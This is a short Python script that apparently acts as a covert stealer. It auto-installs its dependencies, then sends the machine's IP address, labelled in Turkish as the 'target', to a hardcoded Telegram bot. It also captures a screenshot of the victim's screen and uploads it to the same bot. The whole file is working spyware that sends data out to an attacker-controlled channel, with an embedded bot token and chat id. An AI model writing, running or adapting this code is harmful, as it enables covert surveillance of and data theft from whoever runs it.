import os
try:
  import socket
except:
  os.system("pip install socket")
try:
  import requests
except:
  os.system("pip install requests")
try:
  import pyautogui
except:
  os.system("pip install pyautogui")
import pyautogui
import io
import socket
import requests
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)

requests.get(f"https://api.telegram.org/bot5901651008:AAE1CX1hIQEVwWUA38s9CyexI_lHk1suE70/sendmessage?chat_id=1887858124&text=Hedef İp Adresi : {ip_address}\n")
url = f"https://api.telegram.org/bot5901651008:AAE1CX1hIQEVwWUA38s9CyexI_lHk1suE70/sendPhoto"
screenshot = pyautogui.screenshot()
image_bytes = io.BytesIO()
screenshot.save(image_bytes, format='PNG')
image_bytes.seek(0)
files = {'photo': image_bytes}
data = {'chat_id': "1887858124"}
response = requests.post(url, files=files, data=data)
